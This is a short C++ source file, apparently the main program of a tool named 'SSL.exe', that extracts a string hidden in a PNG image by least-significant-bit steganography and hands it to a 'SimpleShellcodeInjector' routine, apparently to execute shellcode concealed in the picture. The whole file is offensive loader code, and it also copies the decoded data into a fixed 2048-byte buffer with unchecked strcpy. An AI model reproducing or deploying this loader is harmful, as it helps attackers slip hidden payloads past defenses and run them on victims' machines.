#include <iostream>
#include "LSB.h"
#include "BasicHandling.h"
#include <Windows.h>
#include "SimpleShellcodeInjector.h"


void usage()
{
    printf("[+] usage: SSL.exe test_encode.png\n");
}


int main(int argc, char* argv[])
{
    const WCHAR* pwcsName;
    char buf[2048];
    int nChars = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, NULL, 0);
    pwcsName = new WCHAR[nChars];
    MultiByteToWideChar(CP_ACP, 0, argv[1], -1, (LPWSTR)pwcsName, nChars);
    std::string text;
    if ((text = LSB_decode(pwcsName)) == "")
    {
        puts("Fail! Check your input!\n");
        usage();
    }
    else
    {
        strcpy(buf, text.c_str());
        Go(buf);
       // std::cout << "Hidden string is: " << text;
    }
    return 0;
}